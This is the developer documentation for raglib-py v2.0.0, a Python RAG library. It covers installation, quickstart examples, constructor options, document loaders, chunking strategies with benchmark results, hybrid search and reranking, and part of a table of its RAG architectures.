# raglib-py (v2.0.0) — Complete Documentation & Developer Guide

**`raglib-py`** is a modular Retrieval-Augmented Generation (RAG) library for Python. It provides a one-line `ask()` helper, a `raglib` command-line tool, a high-level `RAG` facade, **17 LLM providers** (OpenAI, Anthropic, Gemini, OpenRouter, DeepSeek, Mistral, Groq, Ollama, LM Studio, vLLM, ...), **14 RAG architectures** (including **Microsoft-style GraphRAG**), **hybrid BM25 + vector search**, **pluggable rerankers** (cross-encoder, Cohere, LLM), **grounded generation with citations**, **per-session conversation memory**, **3 chunking strategies**, a standalone **Graph-Based Context Window**, **9 web search providers**, **ChromaDB / in-memory / Neo4j storage**, and a built-in **evaluation** module.

- **PyPI Package:** [https://pypi.org/project/raglib-py/](https://pypi.org/project/raglib-py/) (`pip install raglib-py`)
- **Python Import Name:** `raglib` (`import raglib`)
- **GitHub Repository:** [https://github.com/himanshuhs9011/raglib](https://github.com/himanshuhs9011/raglib)

---

## Table of Contents

1. [Installation](#1-installation)
2. [60-Second Quickstart (Offline & Cloud)](#2-60-second-quickstart-offline--cloud)
   - [Presets & Production Setup](#presets--production-setup)
3. [The `RAG` Facade API (Complete Reference)](#3-the-rag-facade-api-complete-reference)
4. [Supported Input Sources & Loaders](#4-supported-input-sources--loaders)
5. [Chunking Strategies (`fixed`, `recursive`, `embedding`, `llm`)](#5-chunking-strategies-fixed-recursive-embedding-llm)
6. [Retrieval: Hybrid Search, Filters, MMR & Reranking](#6-retrieval-hybrid-search-filters-mmr--reranking)
7. [All 14 Built-In RAG Architectures](#7-all-14-built-in-rag-architectures)
8. [GraphRAG (Knowledge-Graph RAG)](#8-graphrag-knowledge-graph-rag)
9. [Standalone Graph-Based Context Window (`GraphContextWindow`)](#9-standalone-graph-based-context-window-graphcontextwindow)
10. [LLM, Embedding, Vision & Vector Store Configuration](#10-llm-embedding-vision--vector-store-configuration)
11. [Web Search Providers (All 9 Providers)](#11-web-search-providers-all-9-providers)
12. [Conversations, Streaming, Async & Tracing](#12-conversations-streaming-async--tracing)
13. [Evaluation](#13-evaluation)
14. [Building Custom Pipelines from Core Components](#14-building-custom-pipelines-from-core-components)
15. [Core Data Schemas](#15-core-data-schemas)
    - [Seeing the Graph](#seeing-the-graph) · [Security & Privacy](#security--privacy) · [Guardrails](#guardrails) · [Scaling & Concurrency](#scaling--concurrency)
16. [Migrating from v1 to v2](#16-migrating-from-v1-to-v2)

---

## 1. Installation

### Standard Installation (PyPI)

The core is pure Python with **no required dependencies** (BM25 search, in-memory vectors, every pipeline). Install only the integrations you use:

```bash
pip install raglib-py
```

### Optional Feature Extras

```bash
# Everything
pip install "raglib-py[all]"

# Or pick what you need:
# Chat and embedding providers (OpenAI, Anthropic, Gemini, OpenRouter, Groq, Ollama, ...) need no extra:
# raglib calls their HTTP APIs directly. The [openai], [anthropic], ... extras still install (as no-ops).
pip install "raglib-py[hf]"              # local HuggingFace / SentenceTransformers embeddings
pip install "raglib-py[rerank]"          # cross-encoder reranker (bge-reranker)
pip install "raglib-py[fast]"            # numpy vector math + tiktoken token counting
pip install "raglib-py[chroma]"          # persistent ChromaDB vector store
pip install "raglib-py[qdrant]"          # Qdrant vector store (in-process, on-disk or server)
pip install "raglib-py[pgvector]"        # PostgreSQL + pgvector vector store
pip install "raglib-py[graph]"           # GraphRAG community detection (networkx)
pip install "raglib-py[neo4j]"           # Neo4j graph store
pip install "raglib-py[pdf,docx,pptx]"   # document loaders
pip install "raglib-py[xlsx]"            # Excel workbooks (loader + SQLTool)
pip install "raglib-py[web]"             # DuckDuckGo web search
pip install "raglib-py[tavily,serpapi]"  # Tavily & SerpAPI SDKs
```

### Install from Source (GitHub)

```bash
git clone https://github.com/himanshuhs9011/raglib.git
cd raglib
pip install -e ".[all,dev]"
```

### Verify Installation

```bash
python -c "import raglib; print(raglib.__version__)"
```

---

## 2. 60-Second Quickstart (Offline & Cloud)

### 0. The Simplest Way (one line, any provider)

```python
from raglib import ask

# provider/model in one string; the key comes from the provider's env var (here OPENROUTER_API_KEY)
print(ask("docs/", "What is our refund policy?", llm="openrouter/openai/gpt-4.1-mini").answer)
```

Or from the terminal:

```bash
export OPENROUTER_API_KEY=sk-or-...          # Windows: set OPENROUTER_API_KEY=sk-or-...
raglib ask docs/ "What is our refund policy?" --llm openrouter/google/gemini-2.5-flash
raglib chat docs/                            # interactive chat with memory
raglib providers                             # list every supported provider
```

If you don't pass `llm`, raglib uses the first provider whose API key is in your environment
(`OPENAI_API_KEY`, `ANTHROPIC_API_KEY`, `OPENROUTER_API_KEY`, `GOOGLE_API_KEY`, `GROQ_API_KEY`, ...),
so `RAG("docs/")` just works.

### A. Zero-Key Offline Quickstart (Local Testing)

Offline mode is **explicit**: pass `offline=True` (or set `RAGLIB_OFFLINE=1`). raglib then uses the deterministic `MockLLMClient` and `MockEmbedding`. Answers are templated from the retrieved sources, not generated by a real model, so use this for tests and demos only.

```python
from raglib import RAG

rag = RAG(
    source="Corrective RAG grades retrieved passages and searches for more knowledge when confidence is low.",
    rag_type="corrective",
    offline=True,
)

result = rag.query("When does Corrective RAG search for more knowledge?")
print("Answer:", result.answer)
print("Citations:", [(c.index, c.document_id) for c in result.citations])
print("Reasoning Trace:", result.reasoning_trace)
```

> Without `offline=True` and without a model, `RAG()` raises a clear error instead of silently answering with a mock.

### B. Production Cloud Quickstart

```python
from raglib import RAG

rag = RAG(
    source="docs/",                      # Folder, file (.pdf/.docx/.pptx/.txt/.md), URL, or list
    rag_type="advanced",                 # default: hybrid search -> rerank -> cited answer

    chat_llm="openai",                   # key from chat_api_key or OPENAI_API_KEY
    chat_model="gpt-4.1-mini",
    embedding_llm="openai",              # text-embedding-3-small by default

    reranker="cross_encoder",            # "none" | "cross_encoder" | "cohere" | "llm"
    vector_db="chroma",
    vector_db_kwargs={"persist_directory": "./index", "collection_name": "company_docs"},
)

response = rag.query("Summarize our security architecture.")
print(response.answer)                   # "... uses mTLS between services [1] ..."
for citation in response.citations:
    print(citation.index, citation.document_id)
```

### C. 100% Free Local Stack (Ollama + HuggingFace + ChromaDB)

```python
from raglib import RAG

rag = RAG(
    source="docs/",
    rag_type="hybrid",
    chat_llm="ollama",
    chat_model="llama3.1",
    embedding_llm="huggingface",
    embedding_model="sentence-transformers/all-MiniLM-L6-v2",
    reranker="cross_encoder",
    vector_db="chroma",
)

print(rag.query("Explain our deployment workflow").answer)
```

---

## Presets & Production Setup

One command writes a complete production pipeline into a new `.py` file. Every option of `RAG(...)` is on its own line with its production value and a comment, so you can see everything you can change:

```bash
raglib-py --production --llm openrouter           # writes rag_pipeline.py + .env.example
raglib-py --production app/my_rag.py --llm anthropic --docs data/
cp .env.example .env                              # add your keys
python rag_pipeline.py "What is our refund policy?" --latency
```

The generated file reads your credentials from `.env`. It looks like this (an excerpt: the real file lists every option):

```python
rag = RAG(
    # ---------------------------------------------------------------- chat model + credentials
    llm="openrouter",                       # "provider" or "provider/model" (chat_llm= is the same option)
    chat_api_key=os.getenv("OPENROUTER_API_KEY"),
    llm_fallbacks=None,                     # e.g. ["groq/llama-3.3-70b-versatile"], tried when the main model fails
    # ---------------------------------------------------------------- chunking
    chunk_size=500,                         # tokens per chunk
    chunk_overlap=100,                      # tokens shared by neighbouring chunks (20% keeps ideas whole)
    # ---------------------------------------------------------------- retrieval
    retrieval_mode="hybrid",                # "hybrid" (BM25 + vectors) | "dense" | "sparse" (BM25 only)
    top_k=3,                                # chunks sent to the LLM
    # ---------------------------------------------------------------- reranking
    reranker="cross_encoder",               # "cross_encoder" (local, pip install raglib-py[rerank]) | "cohere" | "llm" | "none"
    rerank_candidates=10,                   # chunks retrieved for the reranker, which keeps the best top_k
    # ... vector store, memory, GraphRAG, web search, access control, tracing ...
)
```

| Production value | Setting | Library default |
| :--- | :--- | :--- |
| 500 / 100 (20%) | `chunk_size` / `chunk_overlap` | 400 / 50 |
| hybrid (BM25 + vectors) | `retrieval_mode` | hybrid when an embedding is set |
| 10 chunks retrieved for the reranker | `rerank_candidates` | `max(4 * top_k, 20)` |
| `"cross_encoder"` (local `BAAI/bge-reranker-base`) | `reranker` | `"none"` |
| 3 chunks sent to the LLM | `top_k` | 5 |
| tier 0 guardrails on every stage (see [Guardrails](#guardrails)) | `input_guards` / `retrieval_guards` / `output_guards` / `tool_policy` | off |
| `llm_max_tokens=4096`: each answer stops after 4096 generated tokens, reasoning included, which caps its cost | `llm_max_tokens` | provider default |

`preset="production"` sets `llm_max_tokens=4096`. Reasoning models count their hidden thinking against it: with 1024, a reasoning model used the whole budget thinking on 20 of 34 questions about one paper. Apps that generate long reports should raise it further. An answer cut off at the limit is flagged in `result.metadata["degraded"]`, and no answer text at all raises `LLMOutputTruncatedError` instead of returning an empty answer. The cap applies to the chat, cheap and fallback models that raglib builds from a provider name. GraphRAG extraction has its own limit (`graph_kwargs={"extraction_max_tokens": ...}`). `MaxOutputTokens` is different: it only trims what is shown, after the tokens were paid for.

`raglib init [PATH] --preset production` does the same as `raglib-py --production`. Both refuse to overwrite a file unless you pass `--force`. The cross-encoder needs `pip install raglib-py[rerank]`. Without it raglib logs a warning and keeps the hybrid order.

For quick scripts, the same values are also available in code (anything you pass yourself wins): `RAG("docs/", llm="openai", preset="production")`, or `raglib ask docs/ "Question?" --preset production`.

To customize more, every option is explained in [section 3](#3-the-rag-facade-api-complete-reference) and the sections after it.

---

## 3. The `RAG` Facade API (Complete Reference)

### Constructor Signature

```python
from raglib import RAG

rag = RAG(
    source=None,                        # str | Path | list of them
    # ---- models
    llm=None,                           # shorthand: "openrouter/anthropic/claude-sonnet-4", "ollama/llama3.1", "mistral", ...
    chat_llm=None,                      # "openai" | "anthropic" | "groq" | "google" | "ollama" | "mock" | BaseLLMClient | LangChain chat model
    embedding_llm=None,                 # "openai" | "google" | "ollama" | "huggingface" | "mock" | "none" (BM25 only) | BaseEmbedding
    vision_llm=None,                    # "openai" | "anthropic" | "google" | "mock" | BaseVisionClient (OCR for scanned PDF pages)
    llm_key=None,                       # Shared API key fallback
    chat_api_key=None, embedding_api_key=None, vision_api_key=None,
    chat_model=None, chat_base_url=None,
    embedding_model=None, embedding_base_url=None,
    vision_model=None, vision_base_url=None,
    offline=None,                       # True -> explicit mock models (or RAGLIB_OFFLINE=1)
    llm_cache=True,                     # LRU cache for identical (system, prompt) LLM calls
    llm_timeout=60.0, llm_max_retries=2,  # per-call timeout + exponential-backoff retries
    llm_temperature=0.0,                # sampling temperature for models built from a provider name
    llm_max_tokens=None,                # cap on answer length (mapped to each provider's parameter)
    # ---- pipeline
    rag_type="advanced",                # One of the 14 RAG architectures
    top_k=5,                            # Documents passed to generation
    max_context_tokens=3000,            # Generation context budget (tiktoken when installed)
    rewrite_query=False,                # LLM query rewriting before retrieval
    # ---- chunking
    chunk_size=400, chunk_overlap=50,   # words (each Chinese/Japanese/Thai character counts as one); a hard limit
    chunking_strategy="fixed",          # "fixed" | "recursive" | "embedding" (semantic, embeddings) | "llm"
    # ---- retrieval
    retrieval_mode=None,                # "hybrid" (default with embeddings) | "dense" | "sparse"
    fusion="relative",                  # hybrid fusion: "relative" (score-based) | "rrf"
    hybrid_alpha=0.5,                   # weight of the dense score in relative fusion
    fetch_k=None,                       # candidates fetched before rerank/MMR
    mmr_lambda=None,                    # e.g. 0.5 to diversify results with MMR
    neighbor_window=0,                  # small-to-big: attach N neighbouring chunks to each hit
    reranker="none",                    # "none" | "cross_encoder" | "cohere" | "llm"
    reranker_model=None, reranker_api_key=None,
    vector_db=None,                     # "memory" (default) | "chroma" | "qdrant" | "pgvector" | BaseVectorStore
    vector_db_kwargs=None,              # e.g. {"persist_directory": "...", "collection_name": "...", "host": ...}
    # ---- memory
    memory=None,                        # True to enable conversation memory for any rag_type
    max_history_turns=10, max_history_tokens=1200,
    conversation_store=None,            # e.g. SQLiteConversationStore("chats.db") to persist sessions
    # ---- web search (OFF unless configured)
    web_search_provider=None,           # "duckduckgo" | "local" | "tavily" | "serpapi" | "brave" | "bing" | "google_cse" | "exa" | "searxng"
    web_search_api_key=None, web_search_base_url=None, web_search_cse_id=None,
    web_search_provider_kwargs=None, validate_web_search_api_key=False,
    # ---- GraphRAG
    enable_graph=False,                 # build the knowledge graph for non-graph rag_types (agentic/routing tools)
    graph_store=None,                   # "networkx" (default) | "neo4j" | BaseGraphStore
    graph_kwargs=None,                  # see section 8
    # ---- agents & observability
    tools=None,                         # [Tool(...), SQLTool(...)] for rag_type="agentic"
    strict=False,                       # True: raise when an optional step fails instead of degrading
    access_control=None,                # True / AccessControl(...): per-document permissions (see "Access Control")
    preset=None,                        # "production": tested settings for every argument you leave out
    rerank_candidates=None,             # chunks retrieved for the reranker to cut to top_k
    rerank_skip_threshold=None,         # skip the reranker when the top hit's cosine similarity is >= this
    rerank_skip_margin=None,            # ...and at least this far above the runner-up
    llm_cache_ttl=86400,                # seconds before a cached LLM response expires (24 h; None = never)
    embedding_timeout=None,             # seconds per embedding API request (raglib-built models)
    reranker_timeout=10.0,              # seconds per Cohere rerank request (then first-stage order + warning)
    embedding_max_tokens=None,          # embedding model input limit (default: known per model)
    oversized_chunks=None,              # chunk longer than the embedding model reads: None (auto) | "split" | "warn" | "raise"
    allow_web_after_private=False,      # agent web search after retrieving non-public documents
    input_guards=None,                  # guardrails on the question: [PIIMasker(), UserRateLimit(30), ...] | "default"
    retrieval_guards=None,              # on the retrieved documents: [NothingRelevant()] | "default"
    output_guards=None,                 # on the answer: [OutputLeakGuard(), JSONSchemaGuard(schema)] | "default"
    tool_policy=None,                   # agent: ToolPolicy(allowed_tools={role: [...]}, max_tool_calls=8)
    guard_cache_ttl=3600.0,             # seconds a guard decision is reused for the same input (None = off)
    rate_limit_key=None,                # callable(GuardContext) -> str: who limits / budgets count (default: user id)
    guard_store=None,                   # GuardStore for limit counters (default: in this process only)
    stream_holdback_chars=64,           # how far streamed text may trail the model while output guards check it (min 40)
    secure_defaults=True,               # always-on protections (citation access, tool limit, injection/secret flags, external links)
    guard_models=None,                  # optional local models for tier 1 guards (never downloaded for you)
    judge_model=None,                   # tier 2 LLM judge for unsure / high-risk checks (default: cheapest model)
    judge_budget=None,                  # JudgeBudget(max_calls_per_minute=..., max_usd_per_day=...): past it, tier 1 stands
    embedding_cache_ttl=None,           # seconds before a cached embedding expires
    cache_personalized=False,           # False: no caching for queries with user= / filters= (public tier only)
    answer_cache=None,                  # True: question-level answer cache (FAQ tier)
    prompt_caching=False,               # Anthropic cache_control on the system prompt
    cheap_llm=None,                     # cheaper model for easy questions (tier routing)
    tier_router=None,                   # callable(question, context) -> "faq" | "cheap" | "full"
    parent_retrieval=None,              # "heading" | "fixed": search small chunks, answer from parent sections
    parent_chunk_size=2000,             # max tokens of a parent section
    semantic_breakpoint="percentile",   # chunking_strategy="embedding": "percentile" | "standard_deviation" | "interquartile" | "gradient" | "fixed"
    semantic_threshold=None,            # percentile (95) or cosine similarity (0.75) where a chunk ends
    prices=None,                        # PriceTable: USD cost per stage in result.usage
    semantic_min_tokens=None,           # smallest embedding-based chunk (default min(32, chunk_size // 8))
    token_counter=None,                 # None = "units" (words; warns, becomes "auto" in 3.0) | "tiktoken" | "auto" | callable
    on_embedding_failure="fallback",    # "raise": a failed embedding call fails ingestion instead of falling back
    abbreviations=None,                 # words that don't end a sentence (default Dr., Mr., e.g., i.e., Inc., No., ...)
    semantic_buffer_size=2,             # sentences compared on each side of a gap
    semantic_number_of_chunks=None,     # approximate number of chunks per document (overrides the threshold)
    sentence_splitter=None,             # regex or callable (default: multilingual splitter)
    semantic_overlap_sentences=0,       # repeat the last N sentences of a chunk in the next one
    on_event=None,                      # callback(TraceEvent) for every pipeline stage
    output_dir=None,                    # write each query result as JSON
    **rag_type_kwargs,                  # forwarded to the orchestrator (e.g. max_hops=3, search_mode="global")
)
```

### Facade Methods

| Method | Description |
| :--- | :--- |
| `rag.query(question, session_id=None, filters=None, user=None)` | Run the pipeline. Returns `GenerationResult(answer, sources, citations, reasoning_trace, trace_events, usage)`. |
| `rag.stream(question, ...)` | Generator of answer tokens; its return value is the final `GenerationResult`. |
| `await rag.aquery(question, ...)` | Async query. |
| `rag.add(source, access=None, metadata=None) -> int` | Idempotent upsert: unchanged documents are skipped, changed ones replace their old chunks. Returns new chunks indexed. |
| `rag.update(source)` / `rag.delete(source)` | Re-ingest changed sources / remove every chunk (and graph entity) from a source. |
| `rag.save(dir)` / `rag.load(dir, allow_model_change=False)` | Persist and restore the chunk index, in-memory vectors and knowledge graph without re-embedding. Files are written atomically; `load` refuses an index built with a different embedding model (pass `allow_model_change=True` to re-embed). |
| `rag.reset_memory(session_id=None)` | Clear one conversation (or all). |
| `rag.evaluate(dataset, judge_llm=None)` | Retrieval + answer-quality metrics (section 13). |
| `rag.rebuild_graph_communities()` | Re-cluster the knowledge graph and refresh changed community reports. |
| `rag.stats()` | Index statistics (chunks, retrieval mode, models, graph size). |
| `rag.chat(session_id="interactive")` | Interactive terminal session with memory (`help`, `history`, `reset`, `clear`, `exit`). |

---

## 4. Supported Input Sources & Loaders

`RAG(source=...)` and `rag.add(...)` automatically detect the input type via `DocumentLoader`:

| Input Type | Example | Loader Used |
| :--- | :--- | :--- |
| **Directory path** | `"./knowledge_base/"` | Recursively loads all supported files in the folder |
| **PDF file** (`.pdf`) | `"report.pdf"` | `PDFLoader` (one document per page; scanned pages via `vision_llm` OCR, otherwise skipped with a warning) |
| **Word file** (`.docx`) | `"spec.docx"` | `WordLoader` |
| **PowerPoint** (`.pptx`) | `"slides.pptx"` | `PPTXLoader` (one document per slide) |
| **Text / Markdown** (`.txt`, `.md`, `.rst`, `.log`, ...) | `"notes.md"` | `TextLoader` |
| **Source code & config** (`.py`, `.js`, `.ts`, `.java`, `.go`, `.sql`, `.yaml`, `.toml`, ...) | `"src/"` | `TextLoader` |
| **HTML file** (`.html`, `.htm`) | `"page.html"` | `HTMLFileLoader` (headings, lists and tables kept; nav/footer dropped; title in metadata) |
| **CSV / TSV** | `"people.csv"` | `CSVLoader` (one `column: value; ...` line per row) |
| **JSON / JSONL** | `"items.jsonl"` | `JSONLoader` (one line per record; other JSON pretty-printed) |
| **Excel** (`.xlsx`) | `"sales.xlsx"` | `XLSXLoader` (one document per sheet; `pip install raglib-py[xlsx]`) |
| **EPUB** (`.epub`) | `"book.epub"` | `EPUBLoader` (one document per chapter, in reading order) |
| **Web URL** (`http://`, `https://`) | `"https://example.com/docs"` | `WebLoader` (keeps headings, paragraphs, lists and tables; prefers `<main>`/`<article>`; drops nav/footer/sidebars; PDF responses are parsed as PDFs) |
| **Raw text string** | `"RAG grounds LLM outputs."` | Wrapped directly as a `Document` (content-hash id) |
| **List of mixed sources** | `["a.pdf", "https://...", "raw note"]` | Each item is routed to its matching loader |

> **Safety Note:** If a string looks like a file or folder path (`"missing_file.pdf"`, `"./my_docs"`, `"data/docs"`, `"C:\docs"`) and does not exist, `DocumentLoader` raises `FileNotFoundError` instead of silently indexing the string as text. Folder scans skip `.git`, `node_modules`, virtualenvs, caches and hidden files, and binary files are skipped with a warning.

---

## 5. Chunking Strategies (`fixed`, `recursive`, `embedding`, `llm`)

| Strategy | Aliases | How It Works | Best For |
| :--- | :--- | :--- | :--- |
| **`"fixed"`** *(default)* | `"fixed_size"`, `"sliding"`, `"sentence"` | Packs complete sentences up to `chunk_size` with sentence-aware `chunk_overlap`. | Clean prose, fast ingestion. |
| **`"recursive"`** | `"recursive_character"` | Splits along structural separators (`"\n\n"`, `"\n"`, `". "`, ... `""`) to keep paragraphs together, then applies overlap. | Markdown, structured reports. |
| **`"embedding"`** | `"semantic_embedding"` | At every gap between sentences, embeds the two sentences before and after it and starts a new chunk where their similarity drops (`semantic_breakpoint="percentile"` cuts above the 95th percentile of distances, `"fixed"` below a cosine similarity). Chunks stay between `semantic_min_tokens` (default `min(32, chunk_size // 8)`) and `chunk_size`. | Legal, medical and financial documents. **Trade-off:** ~2x the corpus in embedding tokens and slower ingestion, for chunks that end at topic changes. |
| **`"llm"`** | `"semantic"`, `"llm_semantic"` | The LLM groups numbered sentences at topic shifts (`CHUNK: start-end`); falls back to `"recursive"` without an LLM. | High-value documents with shifting topics. |

**Small-to-big (parent sections).** `RAG(parent_retrieval="heading", chunk_size=200, parent_chunk_size=2000)` embeds and searches small child chunks for precise matches. The LLM then gets each child's whole parent section, split at Markdown or numbered headings (`"fixed"` uses fixed windows instead). Duplicate sections are removed, and `metadata["child_ids"]` lists the children that matched. **Trade-off:** answers see whole sections, but each source is bigger, so prompts grow and fewer sources fit in `max_context_tokens`. `neighbor_window` remains a separate, lighter option.

**Units vs model tokens.** By default every size (`chunk_size`, `chunk_overlap`, `semantic_min_tokens`) is measured in *units*: whitespace-separated words, with each CJK or Thai character counted as one. Units are not model tokens. English averages about 1.3 tokens per word, so a 500-unit chunk is roughly 650 tokens. Pass `token_counter="tiktoken"` (real `cl100k_base` tokens), `"auto"` (tiktoken when installed, else units) or your own `callable(text) -> int`. The production file uses `"auto"`, and the embedding cost estimate then uses the same counter. The default stays `"units"` because a new counter re-chunks, and so re-embeds, existing indexes.

**Embedding chunker details.**
- **Exact slices:** every chunk is a slice of the original text, so `document.content[chunk.metadata["start_char"]:chunk.metadata["end_char"]] == chunk.content`, and line breaks, tables and lists survive.
- **Tables and lists stay whole:** a Markdown table, or a run of list items (with indented continuation lines and blank lines between items), is one unit. It is only split, at row or item borders, when it is larger than `chunk_size`.
- **Abbreviations:** sentences don't end after `abbreviations` ("Dr. Sharma", "Acme Inc. in 2020", "e.g. tables"; set your own list).
- **Hindi:** the danda `।` / `॥` ends a sentence.
- **Thresholds:** `semantic_breakpoint` is one of `"percentile"` (default 95), `"fixed"` (cosine similarity, 0.75), `"standard_deviation"` (mean + 1.5 sd), `"interquartile"` (mean + 1.5 IQR) or `"gradient"` (95th percentile of the distance gradient, for slowly drifting topics). `semantic_number_of_chunks=8` instead takes the 7 largest gaps, so the count is approximate because size limits still apply.
- **Which threshold to use** (from `benchmarks/chunking/compare_langchain.py`; check on your own data with `benchmarks/chunking/real_eval.py`):

  | Situation | Use | Benchmark (chunk_size=400) |
  | :--- | :--- | :--- |
  | General default | `"percentile"` (95) | precision 0.96: breaks are almost always real topic changes, but recall is 0.54 (some changes missed) |
  | You know about how many topics a document has | `semantic_number_of_chunks=N` | F1 0.87 (P 0.93, R 0.83): takes the N-1 largest gaps |
  | Balanced, topic count unknown | `"standard_deviation"` (1.5) | F1 0.88 (P 0.94, R 0.84), the best overall |
  | Recall matters more than precision (a missed boundary costs more than an extra one) | `"interquartile"` with `semantic_threshold=0.5`, or `"gradient"` with `80` | recall 0.84-0.91 at precision 0.74-0.77 |
  | You have a calibrated similarity cut-off for your embedding model | `"fixed"` | the same cut-off for every document |

  At their *default* thresholds `interquartile` (1.5) and `gradient` (95) are as conservative as `percentile`, with recall of 0.43-0.45. Recall comes from lowering the threshold, and that works for any type (`percentile` at 80: R 0.93). These numbers come from a synthetic corpus with a fake embedding, so confirm on your documents with `benchmarks/chunking/real_eval.py`.

- **Benchmarks:**
  - `benchmarks/chunking/compare_langchain.py` compares the chunker with LangChain's `SemanticChunker` offline, on synthetic documents with known topic changes.
  - `benchmarks/chunking/real_eval.py --docs my_docs/ --golden eval/golden.jsonl --embedding huggingface/BAAI/bge-base-en-v1.5` measures recall@k, precision@k, chunk count and size, and embedding cost on your own documents, for every threshold type and `semantic_min_tokens` 32/64/125. The format is in `benchmarks/chunking/golden.example.jsonl`.
  - With a paid embedding API (`openai/...`), `real_eval.py` prints the estimated tokens and cost and stops unless you pass `--yes`.
  - `langchain-experimental` is being sunset and is no longer maintained. `pip install raglib-py[bench]` pins its last release (0.4.2) so the comparison keeps running.
- **Window:** `semantic_buffer_size=N` compares the N sentences before each gap with the N after it. Bigger windows are smoother and make fewer breaks.
- **Overlap:** `semantic_overlap_sentences=N` repeats the last N sentences of a chunk in the next one, never beyond `chunk_size`. **Trade-off:** more tokens to embed and send, fewer ideas cut at a boundary.
- **Custom splitter:** `sentence_splitter=r"(?<=[.?!])\s+"` (a regex whose matches are boundaries), or a callable `text -> [sentences]` such as a spaCy or NLTK splitter.
- **Failures:** if the embedding call fails, `on_embedding_failure="fallback"` (default) splits that document recursively, labels its chunks `chunking_strategy="recursive_fallback"`, emits a `chunking_fallback` warning event to `on_event`, and counts it in `rag.ingest_usage()["chunking_fallbacks"]`. `"raise"` (production) raises `EmbeddingChunkingError` instead.

**Embedding model limits.** In a new index, no chunk is silently truncated by the embedding model:
- **Limits:** raglib knows the input limit of common models (bge 512, all-MiniLM 256, OpenAI text-embedding-3 8191, Gemini 2048, Ollama nomic-embed-text 2048, ...). Set `embedding_max_tokens` for others.
- **Counting:** chunks are counted with the model's own tokenizer when available (HuggingFace models, and OpenAI via tiktoken). Otherwise a tiktoken estimate is checked against 90% of the limit.
- **Oversized chunks** (`oversized_chunks=None`, the default):
  - In a new index, a chunk over the limit is split further at sentence borders, with an `EmbeddingLimitWarning`, and counted in `ingest_usage()["oversized_chunks_split"]`. A single piece longer than the limit (a base64 blob, minified JSON, a long URL) is cut at character level.
  - An index built before raglib 2.3 (loaded with `load()`) keeps its chunks exactly as they were, so nothing is re-chunked or re-embedded. Oversized chunks there are kept whole with a warning; pass `oversized_chunks="split"` and re-add your documents to split them.
  - `"warn"` always keeps chunks whole, and `"raise"` raises `EmbeddingLimitError` at ingest.
- **Startup check:** if `chunk_size` cannot fit the model, raglib warns at startup and suggests a safe `chunk_size`. Example: 500 tiktoken tokens is over bge-base's 512 WordPiece tokens. With `preset="production"`, the preset's `chunk_size` (500) is fitted to the model with a 10% margin (about 240 tokens, roughly 180 English words, for all-MiniLM's 256), and so is its overlap (20%). A `chunk_size` you pass yourself that cannot fit raises `EmbeddingLimitError` at startup, unless you also pass `oversized_chunks` (`"split"` keeps your `chunk_size` and splits the chunks over the limit at ingest).
- **OpenAI:** inputs are checked before the API call, so an oversized text fails with a clear error instead of a 400 from the API.

**Document versions.** Every chunk (and parent section) carries `metadata["document_version"]`, a hash of its document's content and permissions. Stale vectors can be found in the vector store, or excluded with `filters={"document_version": rag.document_version(doc_id)}`.

`chunk_size` is a hard limit for `fixed` and `recursive`: a line or sentence longer than it is split further, so log files, one-record-per-line data and text without punctuation never end up as one giant chunk. Line breaks inside a chunk are kept. For Chinese, Japanese, Thai, Lao, Khmer and Myanmar each character counts as one unit, and `。！？` end sentences.

Every chunk gets a stable id `{parent_id}_chunk_{n}_{content_hash}` plus `parent_id`, `prev_id` and `next_id` metadata. That's what makes re-ingestion idempotent and neighbour expansion possible. Consecutive PDF pages and slides are linked too, so `neighbor_window` can follow text across a page break.

```python
from raglib import ChunkSplitter, Document, MockLLMClient

docs = [Document(id="doc1", content="First topic sentence one. First topic sentence two. Second topic starts here.")]
splitter = ChunkSplitter(chunk_size=120, overlap=20, strategy="llm", llm_client=MockLLMClient())
for chunk in splitter.split(docs):
    print(chunk.id, chunk.metadata["chunking_strategy"], "->", chunk.content)
```

---

## 6. Retrieval: Hybrid Search, Filters, MMR & Reranking

**Hybrid search is the default** whenever an embedding model is configured. Dense vector search and BM25 run side by side, then:

- `fusion="relative"` *(default)* scores every candidate on **both** signals, min-max normalizes each, and blends them with `hybrid_alpha`. A chunk that is decisive in one signal (e.g. the only chunk containing `INV-2024-0042`) is never out-voted by chunks that are mediocre in both.
- `fusion="rrf"` uses classic rank-only Reciprocal Rank Fusion.

Tokenization is Unicode-aware, including combining marks, so Hindi, Bengali, Tamil, Arabic, Cyrillic and accented Latin all work for BM25. Scripts written without spaces (Chinese, Japanese, Thai, Lao, Khmer, Myanmar) are indexed as overlapping character bigrams (`東京都` -> `東京`, `京都`), so keyword search works for them without a word segmenter.

```python
from raglib import RAG

rag = RAG("docs/", chat_llm="openai", embedding_llm="openai")

# metadata filters (Mongo/Chroma style): $eq $ne $in $nin $gt $gte $lt $lte $and $or
result = rag.query("refund policy", filters={"file": {"$in": ["docs/policy_2026.md"]}})

# diversity + small-to-big context
rag = RAG("docs/", chat_llm="openai", embedding_llm="openai", mmr_lambda=0.5, neighbor_window=1)
```

| Reranker | Setting | Notes |
| :--- | :--- | :--- |
| None *(default)* | `reranker="none"` | Keeps the hybrid order |
| Cross-encoder | `reranker="cross_encoder"`, `reranker_model="BAAI/bge-reranker-base"` | Local, `pip install raglib-py[rerank]` |
| Cohere | `reranker="cohere"` (+ `COHERE_API_KEY`) | Hosted |
| LLM listwise | `reranker="llm"` | One LLM call per query |
| Custom | `Reranker(score_fn=lambda q, texts: [...])` | Any scorer |

When a real reranker is enabled, retrieval automatically fetches `4 x top_k` candidates (at least 20) for it to reorder.

---

## 7. All 14 Built-In RAG Architectures

Select via `RAG(..., rag_type="<name>")` or import the class from `raglib`. Every architecture shares one pipeline (`condense -> retrieve -> rerank -> dedupe -> cited generation -> trace`) and overrides only the step it changes.

| `rag_type` | Class | What it actually does | LLM calls / query* | Best Use Case |
| :--- | :--- | :--- | :--- | :--- |
| **`"naive"`** | `NaiveRAG` | Retrieve -> generate | 1 | Baseline |
| **`"advanced"`** *(default)* | `AdvancedRAG` | Hybrid retrieve -> rerank (when `reranker` is set; default `"none"`) -> dedupe -> cited generate | 1 | Most production Q&A |
| **`"hybrid"`** | `HybridRAG` | Forces BM25 + dense hybrid retrieval | 1 | Keyword-heavy corpora (IDs, codes, names) |
| **`"hybrid_web"`** | `HybridRAG(include_web=True)` | Corpus + live web, fused | 1 | Private docs + fresh public info |
| **`"corrective"`** | `CorrectiveRAG` | Batched relevance grading -> CORRECT: keep relevant sentence strips / INCORRECT: search / AMBIGUOUS: both | 2–4 | Corpora that may not contain the answer |
